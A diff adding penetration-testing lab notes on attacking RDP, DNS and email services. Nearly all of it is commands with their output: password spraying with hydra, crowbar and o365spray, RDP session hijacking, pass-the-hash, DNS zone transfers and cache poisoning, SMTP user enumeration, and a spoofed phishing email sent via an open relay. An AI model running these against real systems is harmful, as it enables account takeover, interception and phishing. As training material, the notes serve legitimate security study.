@@ -1097,111 +1097,628 @@ DESKTOP-0L9D4KA\SQLEXPRESS     Microsoft SQL Server 2019 (RTM sa_remote         
 
 (1 rows affected)
 ```
+## Attacking RDP
+
 ```
-1
+[!bash!]# nmap -Pn -p3389 192.168.2.143 
+
+Host discovery disabled (-Pn). All addresses will be marked 'up', and scan times will be slower.
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-25 04:20 BST
+Nmap scan report for 192.168.2.143
+Host is up (0.00037s latency).
+
+PORT     STATE    SERVICE
+3389/tcp open ms-wbt-server
 ```
 ```
-2
+Attacking RDP
+mdmithu@htb[/htb]# cat usernames.txt 
+
+root
+test
+user
+guest
+admin
+administrator
 ```
 ```
-1
+Attacking RDP
+mdmithu@htb[/htb]# crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
+
+2022-04-07 15:35:50 START
+2022-04-07 15:35:50 Crowbar v0.4.1
+2022-04-07 15:35:50 Trying 192.168.220.142:3389
+2022-04-07 15:35:52 RDP-SUCCESS : 192.168.220.142:3389 - administrator:password123
+2022-04-07 15:35:52 STOP
 ```
 ```
-2
+Attacking RDP
+mdmithu@htb[/htb]# hydra -L usernames.txt -p 'password123' 192.168.2.143 rdp
+
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-08-25 21:44:52
+[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
+[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
+[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 8 login tries (l:2/p:4), ~2 tries per task
+[DATA] attacking rdp://192.168.2.147:3389/
+[3389][rdp] host: 192.168.2.143   login: administrator   password: password123
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-08-25 21:44:56
 ```
 
 ```
-1
+RDP Login
+  Attacking RDP
+mdmithu@htb[/htb]# rdesktop -u admin -p password123 192.168.2.143
+
+Autoselecting keyboard map 'en-us' from locale
+
+ATTENTION! The server uses an invalid security certificate which can not be trusted for
+the following identified reasons(s);
+
+ 1. Certificate issuer is not trusted by this system.
+     Issuer: CN=WIN-Q8F2KTAI43A
+
+Review the following certificate info before you trust it to be added as an exception.
+If you do not trust the certificate, the connection atempt will be aborted:
+
+    Subject: CN=WIN-Q8F2KTAI43A
+     Issuer: CN=WIN-Q8F2KTAI43A
+ Valid From: Tue Aug 24 04:20:17 2021
+         To: Wed Feb 23 03:20:17 2022
+
+  Certificate fingerprints:
+
+       sha1: cd43d32dc8e6b4d2804a59383e6ee06fefa6b12a
+     sha256: f11c56744e0ac983ad69e1184a8249a48d0982eeb61ec302504d7ffb95ed6e57
+
+Do you trust this certificate (yes/no)? yes
 ```
 ```
-2
+Attacking RDP
+C:\htb> tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
 ```
 ```
-1
+Attacking RDP
+C:\htb> query user
+
+ USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
+>juurena               rdp-tcp#13          1  Active          7  8/25/2021 1:23 AM
+ lewen                 rdp-tcp#14          2  Active          *  8/25/2021 1:28 AM
+
+C:\htb> sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
+
+[SC] CreateService SUCCESS
 ```
 ```
-2
+Attacking RDP
+C:\htb> net start sessionhijack
 ```
 ```
-1
+Adding the DisableRestrictedAdmin Registry Key
+  Attacking RDP
+C:\htb> reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
 ```
 ```
-2
+Attacking RDP
+mdmithu@htb[/htb]# xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
+
+[09:24:10:115] [1668:1669] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state            
+[09:24:10:115] [1668:1669] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr                                   
+[09:24:10:115] [1668:1669] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd                                  
+[09:24:10:115] [1668:1669] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr                                 
+[09:24:11:427] [1668:1669] [INFO][com.freerdp.primitives] - primitives autodetect, using optimized                               
+[09:24:11:446] [1668:1669] [INFO][com.freerdp.core] - freerdp_tcp_is_hostname_resolvable:freerdp_set_last_error_ex resetting error state
+[09:24:11:446] [1668:1669] [INFO][com.freerdp.core] - freerdp_tcp_connect:freerdp_set_last_error_ex resetting error state        
+[09:24:11:464] [1668:1669] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
+[09:24:11:464] [1668:1669] [WARN][com.freerdp.crypto] - CN = dc-01.superstore.xyz                                                     
+[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] - VERSION ={                                                              
+[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -        ProductMajorVersion: 6                                           
+[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -        ProductMinorVersion: 1                                           
+[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -        ProductBuild: 7601                                               
+[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -        Reserved: 0x000000                                               
+[09:24:11:464] [1668:1669] [INFO][com.winpr.sspi.NTLM] -        NTLMRevisionCurrent: 0x0F                                        
+[09:24:11:567] [1668:1669] [INFO][com.winpr.sspi.NTLM] - negotiateFlags "0xE2898235"
+
+```
+## Attacking DNS
+
+```
+Attacking DNS
+mdmithu@htb[/htb]# nmap -p53 -Pn -sV -sC 10.10.110.213
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-29 03:47 EDT
+Nmap scan report for 10.10.110.213
+Host is up (0.017s latency).
+
+PORT    STATE  SERVICE     VERSION
+53/tcp  open   domain      ISC BIND 9.11.3-1ubuntu1.2 (Ubuntu Linux)
 ```
 ```
-1
+DIG - AXFR Zone Transfer
+  Attacking DNS
+mdmithu@htb[/htb]# dig AXFR @ns1.inlanefreight.htb inlanefreight.htb
+
+; <<>> DiG 9.11.5-P1-1-Debian <<>> axfr inlanefrieght.htb @10.129.110.213
+;; global options: +cmd
+inlanefrieght.htb.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
+inlanefrieght.htb.         604800  IN      AAAA    ::1
+inlanefrieght.htb.         604800  IN      NS      localhost.
+inlanefrieght.htb.         604800  IN      A       10.129.110.22
+admin.inlanefrieght.htb.   604800  IN      A       10.129.110.21
+hr.inlanefrieght.htb.      604800  IN      A       10.129.110.25
+support.inlanefrieght.htb. 604800  IN      A       10.129.110.28
+inlanefrieght.htb.         604800  IN      SOA     localhost. root.localhost. 2 604800 86400 2419200 604800
+;; Query time: 28 msec
+;; SERVER: 10.129.110.213#53(10.129.110.213)
+;; WHEN: Mon Oct 11 17:20:13 EDT 2020
+;; XFR size: 8 records (messages 1, bytes 289)
 ```
 ```
-2
+Attacking DNS
+mdmithu@htb[/htb]# fierce --domain zonetransfer.me
+
+NS: nsztm2.digi.ninja. nsztm1.digi.ninja.
+SOA: nsztm1.digi.ninja. (81.4.108.41)
+Zone: success
+{<DNS name @>: '@ 7200 IN SOA nsztm1.digi.ninja. robin.digi.ninja. 2019100801 '
+               '172800 900 1209600 3600\n'
+               '@ 300 IN HINFO "Casio fx-700G" "Windows XP"\n'
+               '@ 301 IN TXT '
+               '"google-site-verification=tyP28J7JAUHA9fw2sHXMgcCC0I6XBmmoVi04VlMewxA"\n'
+               '@ 7200 IN MX 0 ASPMX.L.GOOGLE.COM.\n'
+               '@ 7200 IN MX 10 ALT1.ASPMX.L.GOOGLE.COM.\n'
+               '@ 7200 IN MX 10 ALT2.ASPMX.L.GOOGLE.COM.\n'
+               '@ 7200 IN MX 20 ASPMX2.GOOGLEMAIL.COM.\n'
+               '@ 7200 IN MX 20 ASPMX3.GOOGLEMAIL.COM.\n'
+               '@ 7200 IN MX 20 ASPMX4.GOOGLEMAIL.COM.\n'
+               '@ 7200 IN MX 20 ASPMX5.GOOGLEMAIL.COM.\n'
+               '@ 7200 IN A 5.196.105.14\n'
+               '@ 7200 IN NS nsztm1.digi.ninja.\n'
+               '@ 7200 IN NS nsztm2.digi.ninja.',
+ <DNS name _acme-challenge>: '_acme-challenge 301 IN TXT '
+                             '"6Oa05hbUJ9xSsvYy7pApQvwCUSSGgxvrbdizjePEsZI"',
+ <DNS name _sip._tcp>: '_sip._tcp 14000 IN SRV 0 0 5060 www',
+ <DNS name 14.105.196.5.IN-ADDR.ARPA>: '14.105.196.5.IN-ADDR.ARPA 7200 IN PTR '
+                                       'www',
+ <DNS name asfdbauthdns>: 'asfdbauthdns 7900 IN AFSDB 1 asfdbbox',
+ <DNS name asfdbbox>: 'asfdbbox 7200 IN A 127.0.0.1',
+ <DNS name asfdbvolume>: 'asfdbvolume 7800 IN AFSDB 1 asfdbbox',
+ <DNS name canberra-office>: 'canberra-office 7200 IN A 202.14.81.230',
+ <DNS name cmdexec>: 'cmdexec 300 IN TXT "; ls"',
+ <DNS name contact>: 'contact 2592000 IN TXT "Remember to call or email Pippa '
+                     'on +44 123 4567890 or pippa@zonetransfer.me when making '
+                     'DNS changes"',
+ <DNS name dc-office>: 'dc-office 7200 IN A 143.228.181.132',
+ <DNS name deadbeef>: 'deadbeef 7201 IN AAAA dead:beaf::',
+ <DNS name dr>: 'dr 300 IN LOC 53 20 56.558 N 1 38 33.526 W 0.00m',
+ <DNS name DZC>: 'DZC 7200 IN TXT "AbCdEfG"',
+ <DNS name email>: 'email 2222 IN NAPTR 1 1 "P" "E2U+email" "" '
+                   'email.zonetransfer.me\n'
+                   'email 7200 IN A 74.125.206.26',
+ <DNS name Hello>: 'Hello 7200 IN TXT "Hi to Josh and all his class"',
+ <DNS name home>: 'home 7200 IN A 127.0.0.1',
+ <DNS name Info>: 'Info 7200 IN TXT "ZoneTransfer.me service provided by Robin '
+                  'Wood - robin@digi.ninja. See '
+                  'http://digi.ninja/projects/zonetransferme.php for more '
+                  'information."',
+ <DNS name internal>: 'internal 300 IN NS intns1\ninternal 300 IN NS intns2',
+ <DNS name intns1>: 'intns1 300 IN A 81.4.108.41',
+ <DNS name intns2>: 'intns2 300 IN A 167.88.42.94',
+ <DNS name office>: 'office 7200 IN A 4.23.39.254',
+ <DNS name ipv6actnow.org>: 'ipv6actnow.org 7200 IN AAAA '
+                            '2001:67c:2e8:11::c100:1332',
+...SNIP...
 ```
 ```
-1
+Attacking DNS
+mdmithu@htb[/htb]# ./subfinder -d inlanefreight.com -v       
+                                                                       
+        _     __ _         _                                           
+____  _| |__ / _(_)_ _  __| |___ _ _          
+(_-< || | '_ \  _| | ' \/ _  / -_) '_|                 
+/__/\_,_|_.__/_| |_|_||_\__,_\___|_| v2.4.5                                                                                                                                                                                                                                                 
+                projectdiscovery.io                    
+                                                                       
+[WRN] Use with caution. You are responsible for your actions
+[WRN] Developers assume no liability and are not responsible for any misuse or damage.
+[WRN] By using subfinder, you also agree to the terms of the APIs used. 
+                                   
+[INF] Enumerating subdomains for inlanefreight.com
+[alienvault] www.inlanefreight.com
+[dnsdumpster] ns1.inlanefreight.com
+[dnsdumpster] ns2.inlanefreight.com
+...snip...
+[bufferover] Source took 2.193235338s for enumeration
+ns2.inlanefreight.com
+www.inlanefreight.com
+ns1.inlanefreight.com
+support.inlanefreight.com
+[INF] Found 4 subdomains for inlanefreight.com in 20 seconds 11 milliseconds
 ```
 ```
-2
+Subbrute
+  Attacking DNS
+mdmithu@htb[/htb]$ git clone https://github.com/TheRook/subbrute.git >> /dev/null 2>&1
+mdmithu@htb[/htb]$ cd subbrute
+mdmithu@htb[/htb]$ echo "ns1.inlanefreight.com" > ./resolvers.txt
+mdmithu@htb[/htb]$ ./subbrute.py inlanefreight.com -s ./names.txt -r ./resolvers.txt
+
+Warning: Fewer than 16 resolvers per process, consider adding more nameservers to resolvers.txt.
+inlanefreight.com
+ns2.inlanefreight.com
+www.inlanefreight.com
+ms1.inlanefreight.com
+support.inlanefreight.com
+
+<SNIP>
 ```
 ```
-1
+Attacking DNS
+mdmithu@htb[/htb]# host support.inlanefreight.com
+
+support.inlanefreight.com is an alias for inlanefreight.s3.amazonaws.com
+```
+#### Local DNS Cache Poisoning
+From a local network perspective, an attacker can also perform DNS Cache Poisoning using MITM tools like Ettercap or Bettercap.
+
+To exploit the DNS cache poisoning via Ettercap, we should first edit the /etc/ettercap/etter.dns file to map the target domain name (e.g., inlanefreight.com) that they want to spoof and the attacker's IP address (e.g., 192.168.225.110) that they want to redirect a user to:
+```
+Attacking DNS
+mdmithu@htb[/htb]# cat /etc/ettercap/etter.dns
+
+inlanefreight.com      A   192.168.225.110
+*.inlanefreight.com    A   192.168.225.110
+```
+Next, start the Ettercap tool and scan for live hosts within the network by navigating to Hosts > Scan for Hosts. Once completed, add the target IP address (e.g., 192.168.152.129) to Target1 and add a default gateway IP (e.g., 192.168.152.2) to Target2.
+```
+Attacking DNS
+C:\>ping inlanefreight.com
+
+Pinging inlanefreight.com [192.168.225.110] with 32 bytes of data:
+Reply from 192.168.225.110: bytes=32 time<1ms TTL=64
+Reply from 192.168.225.110: bytes=32 time<1ms TTL=64
+Reply from 192.168.225.110: bytes=32 time<1ms TTL=64
+Reply from 192.168.225.110: bytes=32 time<1ms TTL=64
+
+Ping statistics for 192.168.225.110:
+    Packets: Sent = 4, Received = 4, Lost = 0 (0% loss),
+Approximate round trip times in milli-seconds:
+    Minimum = 0ms, Maximum = 0ms, Average = 0ms
+```
+## Attacking Email Services
+
+```
+Host - MX Records
+  Attacking Email Services
+mdmithu@htb[/htb]$ host -t MX hackthebox.eu
+
+hackthebox.eu mail is handled by 1 aspmx.l.google.com.
 ```
 ```
-2
+Attacking Email Services
+mdmithu@htb[/htb]$ host -t MX microsoft.com
+
+microsoft.com mail is handled by 10 microsoft-com.mail.protection.outlook.com.
 ```
 ```
-1
+DIG - MX Records
+  Attacking Email Services
+mdmithu@htb[/htb]$ dig mx plaintext.do | grep "MX" | grep -v ";"
+
+plaintext.do.           7076    IN      MX      50 mx3.zoho.com.
+plaintext.do.           7076    IN      MX      10 mx.zoho.com.
 ```
 ```
-2
+Attacking Email Services
+mdmithu@htb[/htb]$ dig mx inlanefreight.com | grep "MX" | grep -v ";"
+
+inlanefreight.com.      300     IN      MX      10 mail1.inlanefreight.com.
 ```
 ```
-1
+Host - A Records
+  Attacking Email Services
+mdmithu@htb[/htb]$ host -t A mail1.inlanefreight.htb.
+
+mail1.inlanefreight.htb has address 10.129.14.128
 ```
 ```
-2
+Port	          Service
+TCP/25	        SMTP Unencrypted
+TCP/143	        IMAP4 Unencrypted
+TCP/110	        POP3 Unencrypted
+TCP/465	        SMTP Encrypted
+TCP/587	        SMTP Encrypted/STARTTLS
+TCP/993	        IMAP4 Encrypted
+TCP/995	        POP3 Encrypted
 ```
 ```
-1
+Attacking Email Services
+mdmithu@htb[/htb]$ sudo nmap -Pn -sV -sC -p25,143,110,465,587,993,995 10.129.14.128
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2021-09-27 17:56 CEST
+Nmap scan report for 10.129.14.128
+Host is up (0.00025s latency).
+
+PORT   STATE SERVICE VERSION
+25/tcp open  smtp    Postfix smtpd
+|_smtp-commands: mail1.inlanefreight.htb, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, CHUNKING, 
+MAC Address: 00:00:00:00:00:00 (VMware)
 ```
 ```
-2
+VRFY Command
+  Attacking Email Services
+mdmithu@htb[/htb]$ telnet 10.10.110.20 25
+
+Trying 10.10.110.20...
+Connected to 10.10.110.20.
+Escape character is '^]'.
+220 parrot ESMTP Postfix (Debian/GNU)
+
+
+VRFY root
+
+252 2.0.0 root
+
+
+VRFY www-data
+
+252 2.0.0 www-data
+
+
+VRFY new-user
+
+550 5.1.1 <new-user>: Recipient address rejected: User unknown in local recipient table
 ```
 ```
-1
+EXPN Command
+  Attacking Email Services
+mdmithu@htb[/htb]$ telnet 10.10.110.20 25
+
+Trying 10.10.110.20...
+Connected to 10.10.110.20.
+Escape character is '^]'.
+220 parrot ESMTP Postfix (Debian/GNU)
+
+
+EXPN john
+
+250 2.1.0 john@inlanefreight.htb
+
+
+EXPN support-team
+
+250 2.0.0 carol@inlanefreight.htb
+250 2.1.5 elisa@inlanefreight.htb
 ```
 ```
-2
+RCPT TO Command
+  Attacking Email Services
+mdmithu@htb[/htb]$ telnet 10.10.110.20 25
+
+Trying 10.10.110.20...
+Connected to 10.10.110.20.
+Escape character is '^]'.
+220 parrot ESMTP Postfix (Debian/GNU)
+
+
+MAIL FROM:test@htb.com
+it is
+250 2.1.0 test@htb.com... Sender ok
+
+
+RCPT TO:julio
+
+550 5.1.1 julio... User unknown
+
+
+RCPT TO:kate
+
+550 5.1.1 kate... User unknown
+
+
+RCPT TO:john
+
+250 2.1.5 john... Recipient ok
 ```
 ```
-1
+USER Command
+  Attacking Email Services
+mdmithu@htb[/htb]$ telnet 10.10.110.20 110
+
+Trying 10.10.110.20...
+Connected to 10.10.110.20.
+Escape character is '^]'.
++OK POP3 Server ready
+
+USER julio
+
+-ERR
+
+
+USER john
+
++OK
 ```
 ```
-2
+Attacking Email Services
+mdmithu@htb[/htb]$ smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
+
+Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )
+
+ ----------------------------------------------------------
+|                   Scan Information                       |
+ ----------------------------------------------------------
+
+Mode ..................... RCPT
+Worker Processes ......... 5
+Usernames file ........... userlist.txt
+Target count ............. 1
+Username count ........... 78
+Target TCP port .......... 25
+Query timeout ............ 5 secs
+Target domain ............ inlanefreight.htb
+
+######## Scan started at Thu Apr 21 06:53:07 2022 #########
+10.129.203.7: jose@inlanefreight.htb exists
+10.129.203.7: pedro@inlanefreight.htb exists
+10.129.203.7: kate@inlanefreight.htb exists
+######## Scan completed at Thu Apr 21 06:53:18 2022 #########
+3 results.
+
+78 queries in 11 seconds (7.1 queries / sec)
 ```
 ```
-1
+O365 Spray
+  Attacking Email Services
+mdmithu@htb[/htb]$ python3 o365spray.py --validate --domain msplaintext.xyz
+
+            *** O365 Spray ***            
+
+>----------------------------------------<
+
+   > version        :  2.0.4
+   > domain         :  msplaintext.xyz
+   > validate       :  True
+   > timeout        :  25 seconds
+   > start          :  2022-04-13 09:46:40
+
+>----------------------------------------<
+
+[2022-04-13 09:46:40,344] INFO : Running O365 validation for: msplaintext.xyz
+[2022-04-13 09:46:40,743] INFO : [VALID] The following domain is using O365: msplaintext.xyz
 ```
 ```
-2
+Attacking Email Services
+mdmithu@htb[/htb]$ python3 o365spray.py --enum -U users.txt --domain msplaintext.xyz        
+                                       
+            *** O365 Spray ***             
+
+>----------------------------------------<
+
+   > version        :  2.0.4
+   > domain         :  msplaintext.xyz
+   > enum           :  True
+   > userfile       :  users.txt
+   > enum_module    :  office
+   > rate           :  10 threads
+   > timeout        :  25 seconds
+   > start          :  2022-04-13 09:48:03
+
+>----------------------------------------<
+
+[2022-04-13 09:48:03,621] INFO : Running O365 validation for: msplaintext.xyz
+[2022-04-13 09:48:04,062] INFO : [VALID] The following domain is using O365: msplaintext.xyz
+[2022-04-13 09:48:04,064] INFO : Running user enumeration against 67 potential users
+[2022-04-13 09:48:08,244] INFO : [VALID] lewen@msplaintext.xyz
+[2022-04-13 09:48:10,415] INFO : [VALID] juurena@msplaintext.xyz
+[2022-04-13 09:48:10,415] INFO : 
+
+[ * ] Valid accounts can be found at: '/opt/o365spray/enum/enum_valid_accounts.2204130948.txt'
+[ * ] All enumerated accounts can be found at: '/opt/o365spray/enum/enum_tested_accounts.2204130948.txt'
+
+[2022-04-13 09:48:10,416] INFO : Valid Accounts: 2
 ```
 ```
-1
+Hydra - Password Attack
+  Attacking Email Services
+mdmithu@htb[/htb]$ hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
+
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-04-13 11:37:46
+[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 67 login tries (l:67/p:1), ~5 tries per task
+[DATA] attacking pop3://10.10.110.20:110/
+[110][pop3] host: 10.129.42.197   login: john   password: Company01!
+1 of 1 target successfully completed, 1 valid password found
 ```
 ```
-2
+O365 Spray - Password Spraying
+  Attacking Email Services
+mdmithu@htb[/htb]$ python3 o365spray.py --spray -U usersfound.txt -p 'March2022!' --count 1 --lockout 1 --domain msplaintext.xyz
+
+            *** O365 Spray ***            
+
+>----------------------------------------<
+
+   > version        :  2.0.4
+   > domain         :  msplaintext.xyz
+   > spray          :  True
+   > password       :  March2022!
+   > userfile       :  usersfound.txt
+   > count          :  1 passwords/spray
+   > lockout        :  1.0 minutes
+   > spray_module   :  oauth2
+   > rate           :  10 threads
+   > safe           :  10 locked accounts
+   > timeout        :  25 seconds
+   > start          :  2022-04-14 12:26:31
+
+>----------------------------------------<
+
+[2022-04-14 12:26:31,757] INFO : Running O365 validation for: msplaintext.xyz
+[2022-04-14 12:26:32,201] INFO : [VALID] The following domain is using O365: msplaintext.xyz
+[2022-04-14 12:26:32,202] INFO : Running password spray against 2 users.
+[2022-04-14 12:26:32,202] INFO : Password spraying the following passwords: ['March2022!']
+[2022-04-14 12:26:33,025] INFO : [VALID] lewen@msplaintext.xyz:March2022!
+[2022-04-14 12:26:33,048] INFO : 
+
+[ * ] Writing valid credentials to: '/opt/o365spray/spray/spray_valid_credentials.2204141226.txt'
+[ * ] All sprayed credentials can be found at: '/opt/o365spray/spray/spray_tested_credentials.2204141226.txt'
+
+[2022-04-14 12:26:33,048] INFO : Valid Credentials: 1
 ```
 ```
-1
+Attacking Email Services
+mdmithu@htb[/htb]# nmap -p25 -Pn --script smtp-open-relay 10.10.11.213
+
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-28 23:59 EDT
+Nmap scan report for 10.10.11.213
+Host is up (0.28s latency).
+
+PORT   STATE SERVICE
+25/tcp open  smtp
+|_smtp-open-relay: Server is an open relay (14/16 tests)
 ```
+(shodan)[https://www.shodan.io/]
 ```
-2
-```
-```
-1
-```
-```
-2
-```
-```
-1
+Attacking Email Services
+mdmithu@htb[/htb]# swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Company Notification' --body 'Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/' --server 10.10.11.213
+
+=== Trying 10.10.11.213:25...
+=== Connected to 10.10.11.213.
+<-  220 mail.localdomain SMTP Mailer ready
+ -> EHLO parrot
+<-  250-mail.localdomain
+<-  250-SIZE 33554432
+<-  250-8BITMIME
+<-  250-STARTTLS
+<-  250-AUTH LOGIN PLAIN CRAM-MD5 CRAM-SHA1
+<-  250 HELP
+ -> MAIL FROM:<notifications@inlanefreight.com>
+<-  250 OK
+ -> RCPT TO:<employees@inlanefreight.com>
+<-  250 OK
+ -> DATA
+<-  354 End data with <CR><LF>.<CR><LF>
+ -> Date: Thu, 29 Oct 2020 01:36:06 -0400
+ -> To: employees@inlanefreight.com
+ -> From: notifications@inlanefreight.com
+ -> Subject: Company Notification
+ -> Message-Id: <20201029013606.775675@parrot>
+ -> X-Mailer: swaks v20190914.0 jetmore.org/john/code/swaks/
+ -> 
+ -> Hi All, we want to hear from you! Please complete the following survey. http://mycustomphishinglink.com/
+ -> 
+ -> 
+ -> .
+<-  250 OK
+ -> QUIT
+<-  221 Bye
+=== Connection closed with remote host.
 ```
 ```
 2
